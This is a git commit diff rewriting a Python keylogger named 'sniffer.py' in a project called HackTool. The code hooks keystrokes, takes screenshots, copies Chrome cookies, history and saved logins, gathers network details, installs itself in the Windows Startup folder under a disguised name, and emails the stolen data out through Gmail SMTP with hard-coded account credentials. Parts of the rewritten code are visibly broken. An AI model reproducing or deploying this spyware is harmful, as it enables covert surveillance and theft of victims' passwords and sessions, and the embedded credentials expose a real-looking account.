816636353d1a6dac923e56a1f5f4c6d5d79f7ad0
Moníque Vil du Afer <monvilafer@gmail.com>
2019-03-09 19:00:22 +0100

    Re-write Sniffer.py

--- HackTool/tools/sniffer.py
+++ HackTool/tools/sniffer.py
@@ -16,9 +16,7 @@ import pythoncom
 import subprocess
 import datetime
 from PIL import ImageGrab
-
 import urllib.request as urllib
-
 from email import encoders as Encoders
 from contextlib import closing
 from email.mime.base import MIMEBase
@@ -27,123 +25,112 @@ from email.mime.multipart import MIMEMultipart
 
 # -----------------------
 
-global passkey
-passkey = "pollasnegras"
-
-global userkey
-userkey = "marcalexander333@gmail.com"
-
 global mail
-mail = [
-
-		'marcalexander333@gmail.com',  # To
-		'marcalexander333@gmail.com',  # From
-		'smtp.gmail.com:587',          # SMTP Server:Port
-		'marcalexander333',            # User
-		'pollasnegras',                # Password
-] 
+mail = {
+		      "to", "marcalexander333@gmail.com",  # To
+		    "from", "marcalexander333@gmail.com",  # From
+		  "server", "smtp.gmail.com:587",          # SMTP Server:Port
+		"username", "marcalexander333",            # User
+		"password", "pollasnegras",                # Password
+} 
 
 # -----------------------
 
-global buffer
-buffer         = ''
+global typedChars
+typedChars = ""
 
 global count_scr
-count_scr      = 0
+count_scr = 0
 
 global count_letter
-count_letter   = 0
+count_letter = 0
 
 global count_scremail
 count_scremail = 0
 
 global check_count
-check_count    = 1000
+check_count = 1000
 
 global PUBLIC_ADDRESS
 PUBLIC_ADDRESS = ""
 
+global totalNewLines
+totalNewLines = 0
+
+global zipfileName
+zipfileName = ""
+
+# ------------------------
+current_system_time        = datetime.datetime.now()   # Get current system time
+# ------------------------
+path                       = os.path.join("C:" + os.path.sep, "Users", "Public", "Intel", "Logs")
 # ------------------------
 
-current_system_time = datetime.datetime.now()   # Get current system time
+path_to_screenshot         = os.path.join(path, "Screenshots")  
+path_to_cookies            = os.path.join(path, "ChromeBrowserData")
+generated_zipfile_location = os.path.join(path, "ToZipScreenshots")
 
-# In this keylogger a folder "Intel" is made in C:\Users\Public\
-# The keystrokes are saved in Logs folder by the name of IntelRST.txt
-# Screenshots are saved in a folder inside Logs
-# 10 Screenshots are sent at a time and are moved to "ToZipScreenshots" for zipping them and send as attachment
+app_paths = [path, path_to_screenshot, generated_zipfile_location, path_to_cookies]
 
-path = os.path.join("C:" + os.path.sep,"Users", "Public", "Intel", "Logs")
+# Crear los directorios que no existan
+for pth in app_paths:
+	if not os.path.exists(os.path.join(path, pth)):
+		print(f"Creating dir: {pth}")
+		os.makedirs(os.path.join(path, pth))
 
-# Screenshots are saved in this folder
-path_to_screenshot = os.path.join("C:" + os.path.sep,"Users", "Public", "Intel", "Logs", "Screenshots" )  
-
-# Cookies will be moved to this folder
-path_to_cookies = os.path.join("C:" + os.path.sep,"Users", "Public", "Intel", "Logs")
-
-# This folder will contain 10 screenshots and will zipped and sent as attachment
-generated_zipfile_location = os.path.join("C:" + os.path.sep,"Users", "Public", "Intel", "Logs", "ToZipScreenshots")
-
-# Contains keystrokes
-file_log = os.path.join("C:" + os.path.sep,"Users", "Public", "Intel", "Logs", "IntelRST.txt")  
-
-currentdir = os.getcwd()    #Get current working directory
-currentuser = getpass.getuser()  #Get current User
+currentdir = os.getcwd()
+currentuser = getpass.getuser()
 
 try:
-	ip_address = socket.gethostbyname(socket.gethostname()) #Get Ip address
-except:
-	pass
+	local_ip_address = socket.gethostbyname(socket.gethostname())
+except: pass
 
-try:
-	os.makedirs(path)
-	os.makedirs(generated_zipfile_location)
-	os.makedirs(path_to_screenshot)
-
-except OSError as exception:
-	if exception.errno != errno.EEXIST:
-		raise
-
-# Function to check if the computer is connected to Internet
+# Checks if the computer is connected to Internet
 def isInternetConnected():
+
+	print("Checking Internet Connection")
+
 	try:
-		response = urllib.urlopen('https://www.google.com')
+		response = urllib.urlopen("https://www.google.co.jp")
 		return True
 
-	except:
-		pass
-
-	return False
+	except: 
+		return False
 
 def subprocess_args(include_stdout = True):
-	if hasattr(subprocess, 'STARTUPINFO'):
+	if hasattr(subprocess, "STARTUPINFO"):
 		si = subprocess.STARTUPINFO()
 		si.dwFlags |= subprocess.STARTF_USESHOWWINDOW
 		env = os.environ
+
 	else:
 		si = None
 		env = None
 
 	if include_stdout:
-		ret = {'stdout:': subprocess.PIPE}
+		ret = {"stdout:": subprocess.PIPE}
+
 	else:
 		ret = {}
 
-	ret.update({'stdin': subprocess.PIPE,
-				'stderr': subprocess.PIPE,
-				'startupinfo': si,
-				'env': env })
+	ret.update({"stdin": subprocess.PIPE,
+				"stderr": subprocess.PIPE,
+				"startupinfo": si,
+				"env": env })
 	return ret
 
 # Function to get the Process ID
 def getProcessId(process_name):
-	return [item.split()[1] for item in os.popen('tasklist').read().splitlines()[4:] if process_name in item.split()]
+	return [item.split()[1] for item in os.popen("tasklist").read().splitlines()[4:] if process_name in item.split()]
 
 # Function to get the Public IP
 def getSlavePublicAddress():
+
+	print("Getting Public IP Address")
+
 	try:
-		return urllib.urlopen('http://ip.42.pl/raw').read()
-	except:
-		pass
+		return urllib.urlopen("http://ip.42.pl/raw").read()
+	except: pass
 
 # Function to get the System information
 def getsystemInformation():
@@ -151,8 +138,11 @@ def getsystemInformation():
 
 # Function to get the output of command ipconfig /all
 def getIPConfig():
+
+	print("Getting IP config")
+
 	try:
-		ipcfg_file = os.path.join("C:" + os.path.sep,"Users", "Public", "Intel", "Logs", "ipcfg.txt")
+		ipcfg_file = os.path.join(path, "ipcfg.txt")
 		f = open(ipcfg_file, "w")
 		f.write(subprocess.check_output(["ipconfig", "/all"], **subprocess_args(False)))
 		f.close()
@@ -162,19 +152,22 @@ def getIPConfig():
 
 # Function to combine all the slave information and save in the info.txt file
 def getslaveInfo():
-	slave_info = os.path.join("C:" + os.path.sep,"Users", "Public", "Intel", "Logs", "info.txt")
+
+	print("Getting slave information")
+
+	slave_info = os.path.join(path, "info.txt")
 	open_slave_info = open(slave_info, "w")
 
 
 	open_slave_info.write("\n------------------------------\n")
 	try:
-		open_slave_info.write(PUBLIC_ADDRESS + "\n")
+		open_slave_info.write(str(PUBLIC_ADDRESS) + "\n")
 	except Exception as e:
 		pass
 
 	open_slave_info.write("\n------------------------------\n")
 	try:
-		open_slave_info.write(' '.join(str(s) for s in getsystemInformation()) + '\n')
+		open_slave_info.write(" ".join(str(s) for s in getsystemInformation()) + "\n")
 	except Exception as e:
 		pass
 
@@ -183,64 +176,28 @@ def getslaveInfo():
 	
 def copyToStartup():
 
+	print("Copying to startup")
+
 	"""Copy the current executable to MS Windows Startup"""
 
 	original_filename = "sniffer.py"   # TODO: CAMBIAR
-	new_filename      = 'nyancat.py' # The file will be copied to startup folder by this name
+	new_filename      = "nyancat.py" # The file will be copied to startup folder by this name
 
-	copytodir   = os.path.join("C:" + os.path.sep, "Users", currentuser ,"AppData", "Roaming", "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
-	copyfromdir = os.path.join(currentdir, original_filename)
+	to  = os.path.join("C:" + os.path.sep, "Users", currentuser ,"AppData", "Roaming", "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
 
-	filesindir = os.listdir(copytodir)
+	files_in_destination_dir = os.listdir(to)
 
-	if new_filename not in filesindir:
-		shutil.copy2(copyfromdir, copytodir + new_filename)
-
-	else:
-		sys.exit() # El HackTool ya se ha ejecutado previamente, abortar la ejecucion
-
-def walkAllDirectories():
-	"""List directory content up to level 3"""
-
-	# TODO: Reformat everything, this is a complete chaos
-
-	file_dir1 = os.path.join("C:" + os.path.sep,"Users", "Public", "Intel", "Logs", "Dir_View.txt")   #The drive hierarchy will be saved in this file
-
-def sendAsZipFile(filename):
-
-	global mail
-
-	"""Send the data i.e. info.txt, chrome data, login data, screenshots via email as a zipfile"""
-
-	attach = os.path.join("C:" + os.path.sep, "Users", "Public", "Intel", "Logs", filename + ".zip")
-
-	current_timestamp = current_system_time.strftime("%Y%m%d-%H%M%S")
-	SUBJECT = "Attachment " + "From --> " + currentuser + " Time --> " + str(current_timestamp)
-	TEXT    = f"Sent by client {currentuser}:{PUBLIC_ADDRESS}" 
-	
-	msg            = MIMEMultipart() 
-	msg['To']      = mail[0]
-	msg['From']    = mail[1]
-	msg['Subject'] = SUBJECT
-
-	msg.attach(MIMEText(TEXT, 'plain'))
-	fp = open(attach,'rb')
-
-	attach2 = MIMEBase('multipart', 'encrypted') 
-	attach2.set_payload(fp.read())
-	encoders.encode_base64(attach2)
-	attach2.add_header('Content-Disposition', 'attachment', filename = attach)
-
-	msg.attach(attach2) 
-	server = smtplib.SMTP(mail[2]) 
-	server.ehlo()
-	server.starttls() 
-	server.login(mail[3],mail[4])
-	server.sendmail(mail[0], mail[1], msg.as_string()) 				
-	fp.close()
+	# Comprobar si ya se ha copiado el programa
+	if not (new_filename in files_in_destination_dir):
+		shutil.copy2(
+			os.path.join(currentdir, original_filename), 
+			os.path.join(to, new_filename)
+		)
 
 
 def cookieGrabber():
+
+	print("Grabbing Cookies from Chrome")
 
 	"""Obtains Google Chrome Cookies"""
 
@@ -250,8 +207,8 @@ def cookieGrabber():
 		"Local", "Google", "Chrome", "User Data", "Default"
 		)
 
-	cookiefile    = 'Cookies'
-	historyfile   = 'History'
+	cookiefile    = "Cookies"
+	historyfile   = "History"
 	LoginDatafile = "Login Data"
 
 	copycookie    = os.path.join(cookiepath, cookiefile)
@@ -270,236 +227,191 @@ def cookieGrabber():
 		shutil.copy2(copyLoginData, path_to_cookies)
 
 
-def moveAttachmentsToSingleLocation(file_type):
+def moveAttachment(filename_or_folder):
+
+	print("Moving Attachments")
 
 	"""Moves all the files to be sent via email to one place"""
 
-	current_files_location = os.path.join("C:" + os.path.sep,"Users", "Public", "Intel", "Logs", file_type)
+	current_files_location = os.path.join(path, filename_or_folder)
 	
-	if file_type == 'Screenshots':
+	if filename_or_folder == "Screenshots":
 		files = os.listdir(current_files_location)
 
-		for i in range(20):
-			shutil.move(os.path.join(current_files_location, files[i]), generated_zipfile_location)
+		for image in files:
+			shutil.move( 
+				os.path.join(current_files_location, image), 
+				generated_zipfile_location
+			)
 
 	else:
-		shutil.move(current_files_location, generated_zipfile_location)
+		shutil.move(current_files_location, generated_zipfile_location)	
 
+def zipAttachments():
 
-def zipAttachments(file_type):
+	global zipfileName
+
+	print("Zipping Attachments")
 
 	"""Zips all the attachments in order to prepare them to be sent"""
 
-	current_files_location = os.path.join("C:" + os.path.sep,"Users", "Public", "Intel", "Logs", file_type + "Attachments")
+	zipfileName = f"{PUBLIC_ADDRESS}_{generateTimestamp()}"
+
+	shutil.make_archive(zipfileName, "zip") # TODO: Mejorar (usar zipfile?)
+
+
+def clearGeneratedZipFolder():
 	files_in_dir = os.listdir(generated_zipfile_location)
-	shutil.make_archive(current_files_location, 'zip', generated_zipfile_location)
-	
-	# Once zipped, delete previously moved files to save disk space
 	for file_ in files_in_dir:
 		os.remove(os.path.join(generated_zipfile_location, file_))
 
+def clearScreenshotFolder():
+	files_in_dir = os.listdir(path_to_screenshot)
+	for file_ in files_in_dir:
+		os.remove(os.path.join(path_to_screenshot, file_))
 
 def takeScreenShoot():
-	current_timestamp = current_system_time.strftime("%Y%m%d-%H%M%S")
+
+	print("Taking Screenshot")
+
+	current_timestamp = generateTimestamp()
 	scrimg = ImageGrab.grab()
 	scrimg.save(os.path.join(path_to_screenshot, str(current_timestamp) + ".png"))
 
-def sendKeystrokesByMail():
 
-	global mail
+def sendMail(subject, message, attachment, timestamp = False):
+	try:
+		global mail
+		mail_timestamp = current_system_time.strftime("%m%d-%H%M")
 
-	log_text = open(file_log, "rb")
+		if timestamp == True:
+			SUBJECT = f"{mail_timestamp} | {subject}"
+		else:
+			SUBJECT = subject
+		)
+		MESSAGE = message
 
-	data_buffer = ""
-
-	if isInternetConnected() == True:
-		for line in log_text:
-			data_buffer += str(line)
-
-		current_timestamp = current_system_time.strftime("%Y%m%d-%H%M%S")
-		SUBJECT = "Keylogger data " + "from --> " + currentuser + " Time --> " + str(current_timestamp)
-		MESSAGE = data_buffer + '\n\nUSER : ' + currentuser + '\nIP address : ' + ip_address
-
+		if attachment["exists"] == True:
+			file_to_be_sent = open(attachment["file_path"], "rb")
+			payload = MIMEBase("multipart", "encrypted") 
+			payload.set_payload(file_to_be_sent.read())
+			encoders.encode_base64(payload)
+			payload.add_header("Content-Disposition", "attachment", filename = attachment["file_path"])
+			msg.attach(payload) 
+		
+		# Actually send the email
 		msg = MIMEMultipart() 
-		msg['To'] = mail[0]
-		msg['From'] = mail[1]
-		msg['Subject'] = SUBJECT
-		msg.attach(MIMEText(MESSAGE,'plain')) 
+		msg["To"] = mail["to"]
+		msg["From"] = mail["from"]
+		msg["Subject"] = SUBJECT
+		msg.attach( MIMEText( MESSAGE, # TODO: Convertir a str
+			"plain")) 
 
-		server = smtplib.SMTP(mail[2]) 
+		server = smtplib.SMTP(mail["server"]) 
 		server.ehlo()
 		server.starttls() 				
-		server.login(mail[3],mail[4]) 
-		server.sendmail(mail[0], mail[1], msg.as_string()) 								
+		server.login(mail["username"], mail["password"]) 
+		server.sendmail(mail["to"], mail["from"], msg.as_string()) 								
 		server.quit()
-
-		data = ''
 		server.close()
-		log_text = open(file_log, 'w')
-		log_text.close()
 
+def sendMailNotification(notification_text):
+	attachment = {"exists" : False, "file_path" : ""}
+	subject = f"Notification from {PUBLIC_ADDRESS}"
+	sendMail(subject, notification_text, attachment, timestamp = True)
+
+def generateTimestamp():
+	return current_system_time.strftime("%d/%m/%Y-%H|%M|%S")
 
 def OnKeyboardEvent(event):
-	global count_letter
-	global count_scr
-	global count_scremail
-	global buffer
 
-	logging.basicConfig(filename=file_log, level=logging.DEBUG, format='%(message)s')
-	
-	print(chr(event.Ascii))
-	print("\nTyped {} letters".format(count_letter))
-	
-	if event.Ascii == 13:
-	  
-		buffer = current_system_time.strftime("%d/%m/%Y-%H|%M|%S") + ": " + buffer
-		logging.log(10, buffer)
-		buffer = ''
-		count_letter = count_letter + 1
-		count_scr = count_scr + 1
+	global totalTypedChars
+	global typedChars
+	global totalNewLines
+
+	if event.Ascii == 8: # Borrar (\b)
+		typedChars = typedChars[:-1]
 		
-	elif event.Ascii == 8:
-	  
-		buffer = buffer[:-1]
-		count_letter = count_letter + 1
-		count_scr = count_scr + 1
-		
-	elif event.Ascii == 9:
-	  
-		keys = '\t'
-		buffer = buffer + keys
-		count_letter = count_letter + 1
-		count_scr = count_scr + 1
+	elif event.Ascii == 9: # Tabulador (\t)
+		typedChars += "\t"
+
+	elif event.Ascii == 10: # Salto de linea (\n)
+		typedChars += "\n"
+		totalNewLines += 1
 		
 	elif event.Ascii >= 32 and event.Ascii <= 127:
-	  
-		keys = chr(event.Ascii)
-		buffer = buffer + keys
-		count_letter = count_letter + 1
-		count_scr = count_scr + 1
+		typedChars += chr(event.Ascii)
 
-	if count_letter == 300:
-		count_letter = 0
-		sendKeystrokesByMail()
+	totalTypedChars += 1
 
-	if count_scr == 250:
-		print("Sending Mail")
-		count_scr = 0
-		takeScreenShoot()
-		count_scremail +=  1
+	if totalTypedChars % 250 == 0:
+		# Enviar correo con las pulsaciones del teclado cada
+		# 250 pulsaciones, para evitar dejar rastro, lo mejor
+		# es evitar utilizar archivos auxiliares
 
-		if count_scremail == 20:
-			count_scremail = 0
+		subject = f"Keystrokes from {PUBLIC_ADDRESS}"
+		attachment = {"exists" : False, "file_path" : ""}
 
-			moveAttachmentsToSingleLocation('Screenshots')
-			zipAttachments('Screenshots')
-			sendAsZipFile("ScreenshotsAttachments")
-			
-	return 0
+		sendMail(subject, typedChars, attachment, timestamp = True)
+
+def createPayload():
+	try:
+		files_in_current_dir = os.listdir()
+		moveAttachment("info.txt")
+		
+
+	
+	except Exception as exc:
+		print(str(exc))	
 
 def startHackTool():
+
+	print("Booting...")
+	print("Welcome")
 	
-	global count_scr
-	global count_letter
-	global count_scremail
-	global check_count
 	global PUBLIC_ADDRESS
-	global mail
 
 	try:
 		copyToStartup() # Quite descriptive I think xd
+	except Exception as exc:
+		print(str(exc))
 
-	except: pass
+	os.chdir(path)
 
-	if isInternetConnected() == True: # Cool, now let's go
+	if isInternetConnected() == True: # Cool, now let"s go
 
 		try:
 			PUBLIC_ADDRESS = getSlavePublicAddress()
-	
 		except:
 			PUBLIC_ADDRESS = "E.RR.O.R"
 
-		if check_count == 1000:
+		sendMailNotification("Everything seems fine, connection established\nNow executing payloads!\nStay tunned for more info!")
+			
+		# Obtener Cookies
+		try:
+			cookieGrabber()
+		except Exception as exc:
+			print(str(exc))
 
-			# Restart check_count
-			check_count = 0
+		# Ipconfig
+		try:
+			getIPConfig()
+		except Exception as exc:
+			print(str(exc))
 
-			files_in_dir = os.listdir(path)
-
-			# If there isn't a Payload, create one by packing the necesary files
-			if not (f"{PUBLIC_ADDRESS}_Attachments.zip" in files_in_dir):
-				
-				# walkAllDirectories()  # TODO: Modify this function
-
-				# Obtener Cookies
-				try:
-					cookieGrabber()
-				except: pass
-
-				# Ipconfig
-				try:
-					getIPConfig()
-				except: pass
-
-				# Slave Information
-				try:
-					getslaveInfo()
-				except: pass
-
-				# Moving the attachment before zipping them and send
-				try:
-					moveAttachmentsToSingleLocation('Dir_View.txt')
-				except: pass
-
-				try:
-					moveAttachmentsToSingleLocation('History')
-				except: pass
-					
-				try:
-					moveAttachmentsToSingleLocation('Login Data')
-				except: pass
-					
-				try:
-					moveAttachmentsToSingleLocation('Cookies')
-				except: pass
-					
-				try:
-					moveAttachmentsToSingleLocation('ipcfg.txt')
-				except: pass
-					
-				try:
-					moveAttachmentsToSingleLocation('info.txt')
-				except: pass
-				
-				try:
-					zipAttachments(f'{PUBLIC_ADDRESS}')
-					sendAsZipFile(f"{PUBLIC_ADDRESS}_Attachments", ".zip")
-				except: pass
-
-			current_timestamp = current_system_time.strftime("%Y%m%d-%H%M%S")
-			SUBJECT = currentuser + ' : Slave is connected '
-			MESSAGE = 'IP Address ---> ' + ip_address + '\nTime --> ' + str(current_timestamp)
-
-			msg = MIMEMultipart() 
-			msg['To'] = mail[0]
-			msg['From'] = mail[1]
-			msg['Subject'] = SUBJECT
-
-			msg.attach(MIMEText(MESSAGE,'plain'))							
-			server = smtplib.SMTP(mail[2]) 
-			server.ehlo()
-			server.starttls() 				
-			server.login(mail[3],mail[4]) 
-			server.sendmail(mail[0], mail[1], msg.as_string()) 								
-			server.quit()
+		# Slave Information
+		try:
+			getslaveInfo()
+		except Exception as exc:
+			print(str(exc))
 
 startHackTool()
 
-try:
-	hm = pyHook.HookManager()
-	hm.KeyDown = OnKeyboardEvent
-	hm.HookKeyboard()
-	pythoncom.PumpMessages()
+print("Starting Hooks...")
+
+hm = pyHook.HookManager()
+hm.KeyDown = OnKeyboardEvent
+hm.HookKeyboard()
+pythoncom.PumpMessages()
 	
-except: pass
-	
+
